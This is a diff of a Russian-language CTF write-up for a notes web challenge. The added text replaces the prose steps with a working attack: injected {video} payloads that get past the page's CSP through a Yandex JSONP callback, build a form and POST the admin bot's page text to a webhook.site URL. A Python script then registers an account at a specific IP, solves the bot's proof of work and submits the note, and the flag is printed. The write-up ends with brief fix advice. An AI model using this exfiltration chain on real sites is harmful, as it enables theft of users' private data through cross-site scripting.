@@ -1,50 +1,100 @@
 # Web Challenge 4: Yet Another Notes
 
-## Суть задания
-Есть приложение с заметками и ботом-админом, который открывает публичные заметки. Нужно было украсть приватную заметку бота с флагом.
+## Идея
+Цепочка: HTML injection через `{video}` → обход CSP через JSONP (`*.yandex.net`) → чтение заметки с флагом в контексте бота → отправка на webhook.
 
-## Шаг 1. Нашёл точку инъекции
-В заметке работал специальный `video`-плагин.
-Через него получалось закрыть тег и вставить свой HTML/JS (HTML injection).
+## Шаги решения
+1. Регистрируем свой аккаунт.
+2. Создаём публичную заметку с payload (из нескольких коротких `{video ...}` блоков).
+3. Отправляем UUID заметки боту.
+4. Получаем флаг на webhook.
 
-## Шаг 2. Уперся в CSP и обошёл его
-Обычный inline JS блокировался CSP.
-Но разрешены скрипты с доменов `*.yandex.net`.
+## Команды для выполнения (без готовых скриптов)
 
-Использовал JSONP-эндпоинт Yandex Speller, где параметр `callback` контролируется пользователем. Это дало выполнение своего JS в рамках разрешённого источника.
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+pip install requests
+```
 
-## Шаг 3. Обошёл лимит длины
-Один payload целиком не влезал из-за ограничения длины поля `video id`.
-Поэтому разбил атаку на несколько коротких `{video ...}` блоков, каждый делает маленький шаг.
+Создай `payload.txt` (пример минимально понятного payload, разбитого на короткие шаги):
 
-## Шаг 4. Подготовил эксфильтрацию
-Создал форму, которая отправляет данные на webhook (например, webhook.site):
-1. создаём `form` и `input`;
-2. выставляем `action` на свой webhook;
-3. выставляем `method=POST`.
+```text
+{video id="\"></iframe><form id=f><input id=x></form>"}
+{video id="\"></iframe><textarea id=t>https://webhook.site/YOUR-ID</textarea>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f=document.forms[0])"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x=document.forms[0][0])"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.action=t.value)"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.method='post')"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x.name='d')"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x.value=document.body.innerText)"></script>"}
+{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.submit())"></script>"}
+```
 
-## Шаг 5. Достал флаг из состояния приложения
-Через DOM/React-структуры взял данные заметок, где у бота была приватная заметка `Flag`, и положил её содержимое в `input` формы.
+Создай `exploit_chall4.py`:
 
-## Шаг 6. Отправил боту заметку
-Отправил ссылку на вредоносную заметку боту. Когда бот открыл страницу, скрипт выполнился в его сессии и отправил флаг на webhook.
+```python
+import requests, random, string, socket, re, hashlib, time
+
+BASE = "http://158.160.221.45:4818"
+BOT_HOST, BOT_PORT = "158.160.221.45", 1557
+
+def rnd(p="u", n=8):
+    return p + "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))
+
+s = requests.Session()
+user, pw = rnd("user_"), rnd("pw_")
+s.post(BASE+"/api/auth/register", json={"username":user, "password":pw}, timeout=30).raise_for_status()
+
+payload = open("payload.txt", "r", encoding="utf-8").read()
+r = s.post(BASE+"/api/notes", json={"title":"exploit", "content":payload, "isPublic":True}, timeout=30)
+r.raise_for_status()
+uuid = r.json()["id"]
+print("NOTE_UUID", uuid)
+
+# PoW и отправка UUID боту
+sock = socket.create_connection((BOT_HOST, BOT_PORT), timeout=30)
+banner = sock.recv(4096).decode(errors="replace")
+while "stamp>" not in banner:
+    banner += sock.recv(4096).decode(errors="replace")
+
+m = re.search(r"hashcash -mb(\d+) ([0-9a-f]+)", banner)
+bits, resource = int(m.group(1)), m.group(2)
+prefix = f"1:{bits}:250228:{resource}::"
+counter = 0
+while True:
+    stamp = prefix + f"rnd:{counter:x}"
+    h = hashlib.sha1(stamp.encode()).digest()
+    z = 0
+    for b in h:
+        if b == 0: z += 8; continue
+        while (b & 0x80) == 0: z += 1; b <<= 1
+        break
+    if z >= bits:
+        break
+    counter += 1
+
+sock.sendall((stamp+"\n").encode())
+time.sleep(0.2)
+sock.sendall((uuid+"\n").encode())
+print(sock.recv(4096).decode(errors="replace"))
+sock.close()
+```
+
+Запуск:
+
+```bash
+python3 exploit_chall4.py
+# дальше смотреть входящие POST на webhook.site
+```
 
 ## Флаг
 ```text
 LB{6a93f0d3ab7865413f804b6949546833}
 ```
 
-## Почему это сработало
-- HTML injection в рендере заметки.
-- Повторное выполнение вставленных скриптов.
-- CSP обходится через разрешённый JSONP-источник.
-- Бот открывает пользовательский контент с привилегированной сессией.
-
-## Как исправить
-1. Полностью запретить опасный HTML в заметках (строгая sanitization).
-2. Отказаться от JSONP, использовать только CORS+JSON.
-3. Ужесточить CSP (без небезопасных внешних script-src).
-4. Изолировать сессию бота и не давать ей доступ к приватным данным при просмотре user content.
-
-## Итог
-Решение строится как конструктор: инъекция → обход CSP → чтение данных → эксфильтрация. По отдельности шаги простые, но вместе дают полный захват.
+## Фикс
+- Строгая sanitization пользовательского контента.
+- Убрать JSONP.
+- Пересобрать CSP с жёстким allowlist.
+- Изолировать привилегированного бота.
